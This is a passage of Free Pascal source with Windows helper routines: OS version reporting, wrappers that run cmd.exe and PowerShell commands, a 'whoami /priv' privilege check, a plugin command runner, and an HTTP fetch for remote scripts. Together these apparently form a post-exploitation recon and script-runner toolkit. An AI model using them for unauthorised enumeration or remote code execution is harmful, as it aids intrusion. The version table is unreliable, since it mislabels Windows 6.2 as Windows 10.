//thanks to https://forum.lazarus.freepascal.org/index.php?topic=47308.0
RtlGetNtVersionNumbers(MajorVersion, MinorVersion, Build);
writeln('[*]Major version : ', 'Windows ',MajorVersion);
writeln('[*]Minor version : ', MinorVersion);
writeln('[*]Build  number : ', BuildNumberRec.BuildNumber);

if BuildNumberRec.Build <> BUILD_FREE_VAL then BuildString := BUILD_CHKD_STR;
  writeln('[*]Free/Checked  : ', BuildString);
end;
 function osver: string;
begin
  result := 'Unknown (Windows ' + IntToStr(Win32MajorVersion) + '.' + IntToStr(Win32MinorVersion) + ')';
  case Win32MajorVersion of
    4:
      case Win32MinorVersion of
        0: result := 'Windows 95';
        10: result := 'Windows 98';
        90: result := 'Windows ME';
      end;
    5:
      case Win32MinorVersion of
        0: result := 'Windows 2000';
        1: result := 'Windows XP';
      end;
    6:
      case Win32MinorVersion of
        0: result := 'Windows Vista';
        1: result := 'Windows 7';
        2: result := 'Windows 10';
        3: result := 'Windows 8.1';
      end;
    10:
      case Win32MinorVersion of
        0: result := 'Windows 10';
      end;
  end;
end;
function powershell(command:String):string;
var
Process: Tprocess;
list,outp : Tstringlist;
OutputStream,Param : TStream;
BytesRead    : longint;
Buffer       : array[1..BUF_SIZE] of byte;
ID: dword;
begin


  list := Tstringlist.Create;
  outp := Tstringlist.Create;

  process := Tprocess.Create(nil);
  OutputStream := TMemoryStream.Create;
  Param := TMemoryStream.Create; // we are going to store outputs as memory stream .
  //Param.
  process.Executable:=systemfolder+'\cmd.exe';

  process.Parameters.Add('/c');
    process.Parameters.add('powershell.exe');
  process.Parameters.Add(command);
  process.Parameters.Add(';exit');

  process.Options:= Process.Options +[poWaitOnExit,poUsePipes];
//  for i:=0 to list.Count-1 do begin
  try
  process.Execute;
  //process.Free;


  repeat
   // Get the new data from the process to a maximum of the buffer size that was allocated.
   // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
     BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
     OutputStream.Write(Buffer, BytesRead)
   until BytesRead = 0;    //stop if no more data is being recieved
   outputstream.Position:=0;
   outp.LoadFromStream(outputstream);
   process.ExitCode;
    result := outp.Text;
   //  writeln('[+]    : ',outp.Text);
    // /result := outp;
  // end;

// end;
 // end;
 finally
   process.Free;
   list.Free;
   outp.Free;
   outputstream.Free;
     end;
 end;


function powerit(command:string;res:string):string;
var
outp:string;
begin
 RunCommand('powershell.exe',['-c',command],res);
 writeln(res);
 //res := outp;
end;

function runit(command:string):string;
  var
  runitout:string;
  begin
  RunCommand(systemfolder+'\cmd.exe',['/c',command],runitout);
  result := runitout;
  end;

function executemultijobs(cmd:string;cmd2:string):string;
 var
    process : Tprocess;
    i:integer;
   cmd3,output: string;
    list,outp : Tstringlist;
    OutputStream : TStream;
    BytesRead    : longint;
    Buffer       : array[1..BUF_SIZE] of byte;
begin
   cmd  := 'whoami';
   cmd2 := 'whoami /priv';
   cmd3 := '';
   list := Tstringlist.Create;
   outp := Tstringlist.Create;
   list.Add(cmd);
   list.Add(cmd2);
   process := Tprocess.Create(nil);
   OutputStream := TMemoryStream.Create;    // we are going to store outputs as memory stream .
   process.Executable:=systemfolder+'\cmd.exe';
    process.Options:= [poUsePipes,poStderrToOutPut];
   for i:=0 to list.Count-1 do begin
   try
   process.CommandLine:=list[i];

   process.Execute;
    repeat
    // Get the new data from the process to a maximum of the buffer size that was allocated.
    // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
      BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
      OutputStream.Write(Buffer, BytesRead)
    until BytesRead = 0;    //stop if no more data is being recieved
    outputstream.Position:=0;
    outp.LoadFromStream(outputstream);
    if list[i] = cmd then begin
      writeln('[+] Current User : ',outp.Text)
      end else if list[i]=cmd2 then begin
        writeln('[+] Current Privieleges Allowed : ',outp.Text)
    end;
    //writeln(outp.Text);
   except
     on E: exception do
     writeln(E.Message);
    end;

 end;

end;

function loadingplugin(cmd:string;arg:string):string;
var
    process : Tprocess;
    output: string;
    list : Tstringlist;
    OutputStream : TStream;
    BytesRead    : longint;
    Buffer       : array[1..BUF_SIZE] of byte;

 begin
   list := Tstringlist.Create;
   process := Tprocess.Create(nil);
   OutputStream := TMemoryStream.Create;    // we are going to store outputs as memory stream .
   process.Executable:=systemfolder+'\cmd.exe';
   process.CommandLine:=cmd; // we can add value of arg into params to control plugin output
   try
   process.Options:= [poUsePipes];
   process.Execute;
    repeat
    // Get the new data from the process to a maximum of the buffer size that was allocated.
    // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
      BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
      OutputStream.Write(Buffer, BytesRead)
    until BytesRead = 0;    //stop if no more data is being recieved

  outputstream.Position:=0;
  list.LoadFromStream(outputstream);
  writeln(list.Text);

   finally
   process.Free;
   list.Free;
   end;
end;
function getscript(path:string):string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get(path); // test URL, real one is HTTPS
   getscript := Resultget;
   writeln(getscript);
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;

end;
end.

